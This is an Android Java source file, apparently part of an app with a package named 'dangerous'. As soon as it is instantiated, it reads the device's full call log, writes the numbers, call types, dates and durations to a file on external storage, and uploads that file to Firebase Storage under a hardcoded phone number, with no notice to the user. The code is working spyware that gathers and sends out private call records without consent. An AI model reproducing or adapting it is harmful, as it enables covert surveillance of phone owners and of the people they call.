package com.rrdreamtech.dangerous.CallHistory;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.rrdreamtech.dangerous.MainActivity;
import com.snatik.storage.Storage;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;
import java.util.ConcurrentModificationException;
import java.util.Date;

public class CallHistory {
    MainActivity context;
    String  path;
    Storage storage;
    String newDir;
    FileWriter writer;
    String all;
    File fpath;
    private StorageReference storageRef;
    String number="8519079634";
    String msgData = "";

    public CallHistory(MainActivity mainActivity) {
        this.context=mainActivity;
        getCallDetails();
    }



    private void getCallDetails() {
        storage= writeFileOnInternalStorage();
        create(new File(newDir));
        StringBuffer sb = new StringBuffer();
        Cursor managedCursor = context.managedQuery( CallLog.Calls.CONTENT_URI,null, null,null, null);
        int number = managedCursor.getColumnIndex( CallLog.Calls.NUMBER );
        int type = managedCursor.getColumnIndex( CallLog.Calls.TYPE );
        int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex( CallLog.Calls.DURATION);
        sb.append( "Call Details :");
        while ( managedCursor.moveToNext() ) {
            String phNumber = managedCursor.getString( number );
            String callType = managedCursor.getString( type );
            String callDate = managedCursor.getString( date );
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString( duration );
            String dir = null;
            int dircode = Integer.parseInt( callType );
            switch( dircode ) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            sb.append( "\nPhone Number:--- "+phNumber +" \nCall Type:--- "+dir+" \nCall Date:--- "+callDayTime+" \nCall duration in sec :--- "+callDuration );
            sb.append("\n----------------------------------");
        }
        managedCursor.close();
        Writefile(String.valueOf(sb));
        upload();
        Log.e("history", String.valueOf(sb));
    }



    public Storage writeFileOnInternalStorage(){
        Storage storage = new Storage(context);
        path = storage.getExternalStorageDirectory();
        newDir = path + File.separator + "My Sample Directory";
        storage.createDirectory(newDir);

        return storage;
    }

    public void Writefile(String sBody) {
        try{
            writer.append(sBody);
            writer.flush();
            writer.close();

        }catch (Exception e){
            e.printStackTrace();

        }
    }

    public Writer create(File file) {
        fpath  = new File(file, "Callhistory.docs");
        try {
            writer = new FileWriter(fpath);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return  writer;
    }

    public void upload() {

        storageRef = FirebaseStorage.getInstance().getReference();
        Uri file = Uri.fromFile(new File(String.valueOf(fpath)));
        StorageReference riversRef = storageRef.child("CallHistory").child(number+"/callhistory.docs");
        riversRef.putFile(file)
                .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        // Get a URL to the uploaded content
//                        Uri downloadUrl = taskSnapshot.getDownloadUrl();
                        Log.e("failure ","success");
                    }
                })
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception exception) {
                        // Handle unsuccessful uploads
                        // ...
                        Log.e("failure ","failure");
                    }
                });
    }



}
